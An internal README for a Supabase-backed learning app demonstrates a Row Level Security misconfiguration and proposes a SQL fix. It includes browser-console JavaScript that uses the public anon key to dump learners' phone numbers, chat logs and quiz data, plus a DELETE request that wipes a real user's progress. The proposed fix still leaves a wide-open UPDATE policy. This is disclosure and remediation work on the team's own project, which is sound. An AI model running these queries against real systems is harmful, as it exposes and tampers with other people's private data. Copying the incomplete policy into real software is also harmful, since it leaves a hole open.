# RLS Leak Demo — Show the Team

Goal: prove in under 2 minutes that, today, anyone who opens the app in a browser can read every other learner's chat history, progress, and quiz answers — using only the anon key that's already baked into the page.

**Only run this against your own project.** It's identical to what a curious user could do; we're just showing the team what's currently exposed so we can fix the RLS before the 50-user pilot.

---

## Method A — Browser DevTools (zero setup, most dramatic)

Use this when you want to demo on a projector in a meeting.

### Step 1 — Grab the anon key from the live app

1. Open the dev or prod app in Chrome/Edge.
2. Press `F12` → **Network** tab → reload.
3. Click any request that goes to `*.supabase.co` (e.g. `taksha_modules?select=*`).
4. Look at **Request Headers**. You'll see:
   ```
   apikey: eyJhbGciOi…
   Authorization: Bearer eyJhbGciOi…
   ```
   Copy the `apikey` value — that's the anon key. You can also find it by searching the **Sources** tab for `supabase.co` — the URL + key sit in the compiled JS bundle (`NEXT_PUBLIC_*` means "ship to the browser").

### Step 2 — Paste this into the DevTools Console

Replace the two constants at the top with your project's URL + anon key, then paste the whole block:

```js
// === paste from Network tab ===
const SUPABASE_URL = 'https://jzrsnfpgydiaoeiijypm.supabase.co';
const ANON_KEY     = 'PASTE_THE_APIKEY_HEADER_HERE';
// ==============================

async function q(table, select = '*', limit = 5) {
  const url = `${SUPABASE_URL}/rest/v1/${table}?select=${encodeURIComponent(select)}&limit=${limit}`;
  const r = await fetch(url, {
    headers: { apikey: ANON_KEY, Authorization: `Bearer ${ANON_KEY}` },
  });
  return r.json();
}

console.group('%c⚠ RLS leak demo — all reads use only the PUBLIC anon key', 'color:#B95D3E;font-weight:bold;font-size:14px');

console.log('LEARNERS (device IDs, phones, langs):',
  await q('taksha_learners', 'id,device_id,phone,preferred_lang,last_seen'));

console.log('CHAT LOGS (every question every user has ever asked Taksha):',
  await q('taksha_chat_logs', 'learner_id,lang,user_message,ai_response,created_at', 10));

console.log('QUIZ ATTEMPTS (which questions, which answers, how they scored):',
  await q('taksha_quiz_attempts', 'learner_id,module_id,score,total,created_at', 10));

console.log('PROGRESS (every learner × every module):',
  await q('taksha_progress', 'learner_id,module_id,sections_completed,completed', 10));

console.log('APPLY LOGS (field debrief self-assessments — real client names inside):',
  await q('taksha_apply_logs', 'learner_id,module_id,data,created_at', 10));

console.log('EVENTS (behavioural telemetry):',
  await q('taksha_events', 'learner_id,event_type,event_data,created_at', 10));

console.groupEnd();
```

Each `console.log` expands into a full array of rows. Scroll through `CHAT LOGS` — that's the visceral one. Users will see their own and other users' questions.

### Step 3 — Prove write access too

Still in the console, **pick a real row** from the `PROGRESS` output above, copy its `learner_id` and `module_id`, then run:

```js
// DELETE someone else's progress
await fetch(`${SUPABASE_URL}/rest/v1/taksha_progress?learner_id=eq.PASTE_A_REAL_LEARNER_ID&module_id=eq.M01-intro`, {
  method: 'DELETE',
  headers: { apikey: ANON_KEY, Authorization: `Bearer ${ANON_KEY}` },
}).then(r => console.log('Delete status:', r.status));
```

A `204 No Content` means you just wiped another user's progress from the projector screen. (Re-insert it afterwards if it was a real test account — the demo is the point, not the damage.)

---

## Method B — Standalone HTML file (to send teammates who aren't in the room)

Save the `demo.html` next to this README, edit the two constants at the top, then double-click it. It runs entirely in the browser, no build step.

The HTML file does the same thing as Method A but with a nicer table view — good for async sharing on Slack without asking teammates to paste into DevTools.

---

## What this proves

| Table | SELECT | INSERT | UPDATE | DELETE |
|---|---|---|---|---|
| `taksha_learners` | ✅ anyone | ✅ | ✅ | ✅ |
| `taksha_progress` | ✅ | ✅ | ✅ | ✅ |
| `taksha_quiz_attempts` | ✅ | ✅ | ✅ | ✅ |
| `taksha_apply_logs` | ✅ | ✅ | ✅ | ✅ |
| `taksha_chat_logs` | ✅ read-all | ✅ | ❌ | ❌ |
| `taksha_events` | ❌ | ✅ | ❌ | ❌ |

Everything with ✅ in SELECT is fully exfiltratable by any pilot user.
Everything with ✅ in UPDATE/DELETE is tamperable — you could, for instance, set every learner's `completed` to `true`, or blank everyone's chat history.

## Why this works

- The anon key is embedded in the client bundle (it has to be — the browser queries Supabase directly).
- Supabase enforces Row Level Security (RLS) based on the policies in `supabase/migrations/001_taksha_initial_schema.sql:186-193`.
- Those policies say `USING (true)` — "allow this operation for any authenticated role including anon" — with no filter on `learner_id = auth.uid()` or similar.
- Result: the anon key acts as a full read/write key against those tables.

## What "fix" means

Drop the wide policies and keep only narrow INSERT rights where the client actually needs to write. Rough shape (to be reviewed before running against prod):

```sql
-- Remove the loose policies
DROP POLICY IF EXISTS "Anon manage learners"     ON taksha_learners;
DROP POLICY IF EXISTS "Anon manage progress"     ON taksha_progress;
DROP POLICY IF EXISTS "Anon manage quiz"         ON taksha_quiz_attempts;
DROP POLICY IF EXISTS "Anon manage earned_badges" ON taksha_earned_badges;
DROP POLICY IF EXISTS "Anon manage apply_logs"   ON taksha_apply_logs;
DROP POLICY IF EXISTS "Anon read own chat_logs"  ON taksha_chat_logs;

-- Re-add only the ones the client actually needs
CREATE POLICY "Anon insert learners"  ON taksha_learners      FOR INSERT WITH CHECK (true);
CREATE POLICY "Anon upsert progress"  ON taksha_progress      FOR INSERT WITH CHECK (true);
CREATE POLICY "Anon update progress"  ON taksha_progress      FOR UPDATE USING (true) WITH CHECK (true);
CREATE POLICY "Anon insert quiz"      ON taksha_quiz_attempts FOR INSERT WITH CHECK (true);
CREATE POLICY "Anon insert apply"     ON taksha_apply_logs    FOR INSERT WITH CHECK (true);
CREATE POLICY "Anon insert badges"    ON taksha_earned_badges FOR INSERT WITH CHECK (true);
-- chat_logs: INSERT only (already there). No SELECT.
-- events: INSERT only (already there).
```

After this: the app continues to work (all writes still succeed), but re-running the demo above returns `[]` for every SELECT. Read access for admin still works via the service-role key, which is server-side only.

> ⚠ Caveats:
> - `initLearner` currently does a `.select('id').eq('device_id', …).maybeSingle()` to find an existing learner. That will break under INSERT-only. Two options:
>   1. Move the lookup to a server route (`POST /api/learner/init`) that uses the service-role key.
>   2. Keep the SELECT policy but scope it: `FOR SELECT USING (device_id = current_setting('request.headers.x-device-id', true))` — requires the client to pass its device_id as a header. More work but keeps it client-only.
> - `ModuleLoader` and admin dashboards read from content tables only (`taksha_modules`, `taksha_sections`, `taksha_content`, `taksha_videos`) — those SELECT policies stay.
> - Test in a Supabase branch/staging DB first; watch for admin UIs that happen to read a learner table you just locked down.
